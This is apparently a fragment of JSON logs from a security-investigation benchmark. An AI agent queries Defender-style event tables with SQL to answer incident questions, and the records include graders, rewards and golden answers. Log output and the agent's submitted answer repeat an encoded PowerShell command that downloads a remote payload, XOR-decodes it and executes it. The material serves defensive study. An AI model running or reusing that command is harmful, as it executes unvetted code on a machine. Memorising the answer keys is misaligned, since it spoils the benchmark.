ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('0.0', ''), ('580.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('7660.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.30.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=904.5748.15874673574698872377 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('7660.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.30.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=904.5748.15874673574698872377 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('7660.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.30.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=904.5748.15874673574698872377 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('6388.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.50.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=9476.6700.11750740861975852430 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('6388.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.50.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=9476.6700.11750740861975852430 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('6388.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.50.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=9476.6700.11750740861975852430 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('4656.0', '\"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text'), ('0.0', ''), ('0.0', ''), ('6388.0', '\"msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.13200.50.0 --user-data-dir=\"C:Users\\nathansAppDataLocalPackagesMicrosoftWindows.Client.WebExperience_cw5n1h2txyewyLocalStateEBWebView\" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz --lang=en-US --mojo-named-platform-channel-pipe=9476.6700.11750740861975852430 /pfhostedapp:ef6a4d65c17e6e8aff6aeb30d90c489d9b4411ae'), ('4656.0', '\"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text'), ('0.0', ''), ('0.0', ''), ('0.0', '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "4656, \"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text",
+                "observation": "",
+                "reward": 1,
+                "done": true,
+                "info": {
+                    "check_ans_response": "Analysis: The submitted answer provides the Process ID (4656) and command line that injected code, and while the command line includes additional encoded information, it captures the key components of the golden answer. The essential details are present and correct.\nIs_Answer_Correct: True",
+                    "reward": 1,
+                    "check_ans_reflection": "Reflection: The previous evaluation appears to have carefully assessed the submitted answer with respect to the golden answer, and it correctly determined that the submitted answer includes the key elements required, namely the Process ID and the command line for the code injection. The conclusion seems reasonable.\n\nAnalysis: The submitted answer provides the correct Process ID (4656) and the command line. While the command line in the submitted answer contains additional encoded information compared to the golden answer, the essential components match the golden answer. This additional encoded information does not change the core meaning or the validity of the answer. The submitted answer captures the necessary details about the suspicious process injection accurately.\n\nIs_Answer_Correct: True",
+                    "submitted_answer": "4656, \"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text",
+                    "query_success": true,
+                    "submit": true
+                }
+            }
+        ]
+    },
+    {
+        "success": true,
+        "steps": 6,
+        "reward": 1,
+        "success_query_count": 4,
+        "total_query_count": 5,
+        "question": {
+            "context": "A security incident involving Suspicious Application Window Discovery was observed. Attackers might be attempting to gather information about the target device or network for subsequent attacks. Several entities are involved, including the process `powershell.exe` with various commands and attributes, and the host device `vnevado-win11a`, which is associated with the user account `nathans`.",
+            "question": "Can you identify the Security Identifier (SID) associated with the user account involved in this suspicious activity?",
+            "answer": "S-1-5-21-1240151660-3534038288-105586567-4122",
+            "solution": [
+                "A known tool or technique was used to gather information on a device by an account with SID `S-1-5-21-1240151660-3534038288-105586567-4122`."
+            ],
+            "start_alert": 0,
+            "end_alert": 0,
+            "start_entities": [
+                4,
+                7,
+                5,
+                3,
+                8,
+                9,
+                1,
+                6
+            ],
+            "end_entities": [
+                2
+            ],
+            "shortest_alert_path": [
+                0
+            ]
+        },
+        "trajectory": [
+            {
+                "action": "DESCRIBE process_creation",
+                "observation": "ProgrammingError: Table 'env_monitor_db.process_creation' doesn't exist",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": false,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SHOW TABLES",
+                "observation": "[('AADManagedIdentitySignInLogs',), ('AADNonInteractiveUserSignInLogs',), ('AADServicePrincipalSignInLogs',), ('AZFWApplicationRule',), ('AZFWApplicationRuleAggregation',), ('AZFWDnsQuery',), ('AZFWIdpsSignature',), ('AZFWNetworkRule',), ('AZFWNetworkRuleAggregation',), ('AlertEvidence',), ('AlertInfo',), ('AuditLogs',), ('AzureMetrics',), ('CloudAppEvents',), ('DeviceEvents',), ('DeviceFileCertificateInfo',), ('DeviceFileEvents',), ('DeviceImageLoadEvents',), ('DeviceInfo',), ('DeviceLogonEvents',), ('DeviceNetworkEvents',), ('DeviceNetworkInfo',), ('DeviceProcessEvents',), ('DeviceRegistryEvents',), ('EmailAttachmentInfo',), ('EmailEvents',), ('EmailUrlInfo',), ('Heartbeat',), ('IdentityDirectoryEvents',), ('IdentityLogonEvents',), ('IdentityQueryEvents',), ('MicrosoftAzureBastionAuditLogs',), ('MicrosoftGraphActivityLogs',), ('SecurityAlert',), ('SecurityIncident',), ('SigninLogs',), ('ThreatIntelligenceIndicator',), ('Usage',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceProcessEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountObjectId', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('AccountUpn', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('FileName', 'text', 'YES', '', None, ''), ('FolderPath', 'text', 'YES', '', None, ''), ('FileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessLogonId', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 